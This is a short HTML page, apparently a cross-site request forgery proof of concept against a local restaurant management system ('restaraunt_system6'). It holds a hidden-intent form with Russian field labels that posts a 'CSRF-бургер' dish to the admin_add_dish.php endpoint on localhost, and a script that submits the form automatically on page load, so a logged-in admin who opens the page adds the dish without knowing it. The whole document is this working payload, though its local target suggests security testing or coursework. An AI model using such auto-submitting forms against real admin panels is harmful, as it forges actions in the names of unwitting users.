<form action="http://localhost/restaraunt_system6/admin_add_dish.php" method="POST">
    <br>Название блюда:
    <br><input type="text" name="name" value="CSRF-бургер"/>
    <br>Описание:
    <br><input type="text" name="description" value="CSRF-бургер, очень вкусный для хакеров"/>
    <br>Цена:
    <br><input type="number" name="price" value="399.99"/>
    <br>Доступность:
    <br><input type="checkbox" name="available" checked/>
    
    <br><input type="submit"/>
</form>
<script>
    document.getElementsByTagName("form")[0].submit();
</script>